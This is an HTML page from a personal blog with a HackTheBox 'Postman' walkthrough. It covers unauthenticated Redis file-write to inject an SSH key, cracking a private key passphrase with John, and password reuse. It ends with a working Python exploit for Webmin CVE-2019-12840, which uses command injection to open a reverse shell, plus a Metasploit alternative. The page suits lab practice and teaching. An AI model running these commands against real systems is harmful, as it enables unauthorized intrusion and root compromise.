@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Postman — HackTheBox Walkthrough · Feizal Said</title><meta name="description" content="Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Postman — HackTheBox Walkthrough · Feizal Said"><meta property="og:description" content="Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-postman-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Postman — HackTheBox Walkthrough · Feizal Said"><meta name="twitter:description" content="Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-postman-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-08T00:00:00.000Z">September 8, 2026</time></span> <span class="meta font-mono">11 min read</span> </div> <h1 class="article-title font-display">Postman — HackTheBox Walkthrough</h1> <p class="article-desc">Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root.</p> <ul class="tag-row"> <li class="tag">HackTheBox</li><li class="tag">HTB</li><li class="tag">CPTS</li><li class="tag">Linux</li><li class="tag">Redis</li><li class="tag">Webmin</li><li class="tag">CVE-2019-12840</li><li class="tag">SSH</li><li class="tag">Privilege Escalation</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1046</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1190</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1098.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1552.001</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1552.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1110.002</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1078</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1059.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1068</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> Postman
+<strong>OS:</strong> Linux (Ubuntu 18.04)
+<strong>Difficulty:</strong> Easy
+<strong>Key Techniques:</strong> Unauthenticated Redis, arbitrary file write via <code>CONFIG SET</code>/<code>SAVE</code>, SSH key injection, <code>ssh2john</code> + John, credential reuse, Webmin 1.910 RCE (CVE-2019-12840)</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --min-rate</span><span style="color:#79B8FF"> 10000</span><span style="color:#79B8FF"> -oA</span><span style="color:#9ECBFF"> scans/nmap-alltcp</span><span style="color:#79B8FF"> 10.129.2.1</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 22,80,6379,10000</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -oA</span><span style="color:#9ECBFF"> scans/nmap-tcpscripts</span><span style="color:#79B8FF"> 10.129.2.1</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr><tr><td>80</td><td>HTTP</td><td>Apache httpd 2.4.29 — “The Cyber Geek’s Personal Website”</td></tr><tr><td>6379</td><td>Redis</td><td>Redis key-value store 4.0.9</td></tr><tr><td>10000</td><td>HTTP</td><td>MiniServ 1.910 (Webmin httpd)</td></tr></tbody></table>
+<p>Two findings jump out immediately: <strong>Redis is exposed</strong> (rarely a good sign) and <strong>Webmin 1.910</strong> is a version with a well-known authenticated RCE.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Port 80 hosts a static “under construction” page with no interesting links:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.129.2.1</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> php</span></span>
+<span class="line"><span style="color:#6A737D"># /images  /upload  /css  /js  /fonts  (all 301, nothing useful)</span></span></code></pre>
+<p>Port 10000 plain HTTP returns an error directing to HTTPS; <code>https://10.129.2.1:10000/</code> presents the Webmin login.</p>
+<h3 id="redis-enumeration">Redis Enumeration</h3>
+<p>The Redis service accepts connections <strong>without authentication</strong>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">redis-cli</span><span style="color:#79B8FF"> -h</span><span style="color:#79B8FF"> 10.129.2.1</span></span>
+<span class="line"><span style="color:#B392F0">10.129.2.1:6379</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">info</span></span>
+<span class="line"><span style="color:#6A737D"># requirepass is empty, protected-mode no</span></span>
+<span class="line"><span style="color:#B392F0">10.129.2.1:6379</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">keys</span><span style="color:#79B8FF"> *</span></span>
+<span class="line"><span style="color:#6A737D"># (empty)</span></span></code></pre>
+<hr>
+<h2 id="foothold--unauthenticated-redis-to-ssh-access">Foothold — Unauthenticated Redis to SSH Access</h2>
+<p>With no password and <code>protected-mode no</code>, we can use Redis as an arbitrary file-write primitive by pointing its working directory and dump filename at a target path and calling <code>SAVE</code>.</p>
+<p>The ideal target is the <code>redis</code> service account’s <code>authorized_keys</code> file. Redis serializes the RDB binary around our key, but <code>sshd</code> parses the file line-by-line and ignores the surrounding junk.</p>
+<h3 id="generate-and-inject-a-keypair">Generate and inject a keypair</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh-keygen</span><span style="color:#79B8FF"> -t</span><span style="color:#9ECBFF"> rsa</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> ~/id_rsa_generated</span><span style="color:#79B8FF"> -N</span><span style="color:#9ECBFF"> ""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Pad the public key with blank lines so it survives RDB serialization cleanly</span></span>
+<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> "\n\n"</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> ~/id_rsa_generated.pub</span><span style="color:#E1E4E8">; </span><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> "\n\n"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">></span><span style="color:#B392F0"> spaced_key.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> spaced_key.txt</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> redis-cli</span><span style="color:#79B8FF"> -h</span><span style="color:#79B8FF"> 10.129.2.1</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> set</span><span style="color:#79B8FF"> 0xdf</span></span></code></pre>
+<h3 id="redirect-the-rdb-dump">Redirect the RDB dump</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">redis-cli</span><span style="color:#79B8FF"> -h</span><span style="color:#79B8FF"> 10.129.2.1</span></span>
+<span class="line"><span style="color:#B392F0">10.129.2.1:6379</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">config</span><span style="color:#9ECBFF"> set</span><span style="color:#9ECBFF"> dir</span><span style="color:#9ECBFF"> /var/lib/redis/.ssh</span></span>
+<span class="line"><span style="color:#B392F0">10.129.2.1:6379</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">config</span><span style="color:#9ECBFF"> set</span><span style="color:#9ECBFF"> dbfilename</span><span style="color:#9ECBFF"> "authorized_keys"</span></span>
+<span class="line"><span style="color:#B392F0">10.129.2.1:6379</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">save</span></span></code></pre>
+<h3 id="authenticate">Authenticate</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> ~/id_rsa_generated</span><span style="color:#9ECBFF"> redis@10.129.2.1</span></span>
+<span class="line"><span style="color:#B392F0">redis@Postman:~$</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#6A737D"># uid=107(redis) gid=114(redis) groups=114(redis)</span></span></code></pre>
+<blockquote>
+<p><strong>Note:</strong> writing a PHP webshell to <code>/var/www/html</code> does not work (Apache runs as <code>www-data</code> and the path is not writable by <code>redis</code>). Likewise, <code>MODULE</code> is renamed out in <code>redis.conf</code>, so the Metasploit <code>linux/redis/redis_unauth_exec</code> master/slave module fails.</p>
+</blockquote>
+<hr>
+<h2 id="lateral-movement--redis--matt">Lateral Movement — <code>redis</code> → <code>Matt</code></h2>
+<p>Basic enumeration as <code>redis</code> reveals a world-readable private key backup:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">redis@Postman:/$</span><span style="color:#9ECBFF"> ls</span><span style="color:#79B8FF"> -la</span><span style="color:#9ECBFF"> /opt/id_rsa.bak</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF"> 1</span><span style="color:#9ECBFF"> Matt</span><span style="color:#9ECBFF"> Matt</span><span style="color:#79B8FF"> 1743</span><span style="color:#9ECBFF"> /opt/id_rsa.bak</span></span></code></pre>
+<p>The key is passphrase-protected (<code>Proc-Type: 4,ENCRYPTED</code>). Crack it offline:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python</span><span style="color:#9ECBFF"> /opt/john/run/ssh2john.py</span><span style="color:#9ECBFF"> id_rsa.bak</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> id_rsa_bak.john</span></span>
+<span class="line"><span style="color:#B392F0">john</span><span style="color:#9ECBFF"> id_rsa_bak.john</span><span style="color:#79B8FF"> --wordlist=/usr/share/wordlists/rockyou.txt</span></span>
+<span class="line"><span style="color:#6A737D"># computer2008</span></span></code></pre>
+<p>Direct SSH as <code>Matt</code> is blocked by <code>DenyUsers Matt</code> in <code>sshd_config</code>, so pivot locally — and reuse the passphrase as the account password:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">redis@Postman:/$</span><span style="color:#9ECBFF"> su</span><span style="color:#9ECBFF"> Matt</span></span>
+<span class="line"><span style="color:#B392F0">Password:</span><span style="color:#9ECBFF"> computer2008</span></span>
+<span class="line"><span style="color:#B392F0">Matt@Postman:/$</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#6A737D"># uid=1000(Matt)</span></span>
+<span class="line"><span style="color:#B392F0">Matt@Postman:~$</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> user.txt</span></span></code></pre>
+<hr>
+<h2 id="privilege-escalation--webmin-cve-2019-12840">Privilege Escalation — Webmin CVE-2019-12840</h2>
+<p>Matt’s password also authenticates to Webmin at <code>https://10.129.2.1:10000</code>. Version 1.910 exposes <strong>CVE-2019-12840</strong>: any user with access to the <em>Software Package Updates</em> module can inject commands via the unsanitized <code>u=</code> parameter in <code>package-updates/update.cgi</code>.</p>
+<h3 id="manual-poc-python-requests">Manual PoC (python-requests)</h3>
+<p>Webmin validates the <code>Referer</code>, and the parameter must be supplied twice — so pass <code>data</code> as a list of tuples:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests, requests.packages.urllib3</span></span>
+<span class="line"><span style="color:#E1E4E8">requests.packages.urllib3.disable_warnings()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">s </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.session()</span></span>
+<span class="line"><span style="color:#E1E4E8">s.post(</span><span style="color:#9ECBFF">'https://10.129.2.1:10000/session_login.cgi'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#FFAB70">       data</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">'page'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'user'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'Matt'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'pass'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'computer2008'</span><span style="color:#E1E4E8">}, </span><span style="color:#FFAB70">verify</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Sanity check</span></span>
+<span class="line"><span style="color:#E1E4E8">r </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> s.post(</span><span style="color:#9ECBFF">'https://10.129.2.1:10000/package-updates/update.cgi'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#FFAB70">           data</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[(</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'acl/apt'</span><span style="color:#E1E4E8">), (</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">' | bash -c id'</span><span style="color:#E1E4E8">),</span></span>
+<span class="line"><span style="color:#E1E4E8">                 (</span><span style="color:#9ECBFF">'ok_top'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'Update Selected Packages'</span><span style="color:#E1E4E8">)],</span></span>
+<span class="line"><span style="color:#FFAB70">           verify</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">headers</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">'Referer'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'https://10.129.2.1:10000/'</span><span style="color:#E1E4E8">})</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(r.text)   </span><span style="color:#6A737D"># uid=0(root)</span></span></code></pre>
+<h3 id="reverse-shell">Reverse shell</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># attacker listener</span></span>
+<span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lnvp</span><span style="color:#79B8FF"> 443</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">r </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> s.post(</span><span style="color:#9ECBFF">'https://10.129.2.1:10000/package-updates/update.cgi'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#FFAB70">           data</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[(</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'acl/apt'</span><span style="color:#E1E4E8">),</span></span>
+<span class="line"><span style="color:#E1E4E8">                 (</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">' | bash -c "echo &#x3C;BASE64>|base64 -d|bash -i"'</span><span style="color:#E1E4E8">),</span></span>
+<span class="line"><span style="color:#E1E4E8">                 (</span><span style="color:#9ECBFF">'ok_top'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'Update Selected Packages'</span><span style="color:#E1E4E8">)],</span></span>
+<span class="line"><span style="color:#FFAB70">           verify</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">headers</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span><span style="color:#9ECBFF">'Referer'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'https://10.129.2.1:10000/'</span><span style="color:#E1E4E8">})</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">root@Postman:~#</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">root@Postman:~#</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<h3 id="metasploit-alternative">Metasploit alternative</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">use</span><span style="color:#9ECBFF"> exploit/linux/http/webmin_packageup_rce</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> RHOSTS</span><span style="color:#79B8FF"> 10.129.2.1</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> RPORT</span><span style="color:#79B8FF"> 10000</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> SSL</span><span style="color:#79B8FF"> true</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> USERNAME</span><span style="color:#9ECBFF"> Matt</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> PASSWORD</span><span style="color:#9ECBFF"> computer2008</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> LHOST</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">tun</span><span style="color:#F97583">0></span></span>
+<span class="line"><span style="color:#B392F0">run</span></span></code></pre>
+<blockquote>
+<p>CVE-2019-15107 (the Webmin 1.920 unauthenticated backdoor) is a <strong>dead end</strong> here — this is 1.910 and password changing is disabled.</p>
+</blockquote>
+<hr>
+<h2 id="flags">Flags</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/Matt/user.txt</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<p>Flag values are unique to each HTB instance and are intentionally omitted.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Never expose Redis to the internet unauthenticated.</strong> With write access, <code>CONFIG SET dir</code> + <code>dbfilename</code> + <code>SAVE</code> is an arbitrary file write, which becomes code execution via <code>authorized_keys</code>, cron, or web roots.</li>
+<li><strong>A private key on disk is a credential.</strong> <code>/opt/id_rsa.bak</code> plus a weak passphrase handed over the account.</li>
+<li><strong>Password reuse amplifies any crack.</strong> The same secret (<code>computer2008</code>) was the key passphrase, the system password, and the Webmin password.</li>
+<li><strong>Don’t stop at the first “no”.</strong> <code>DenyUsers Matt</code> was a deliberate obstacle; lateral movement via <code>su</code> kept the chain alive.</li>
+<li><strong>Patch management interfaces.</strong> Webmin 1.910’s <code>Package Updates</code> module is an authenticated root RCE — an admin panel running as root is a direct path to full compromise.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
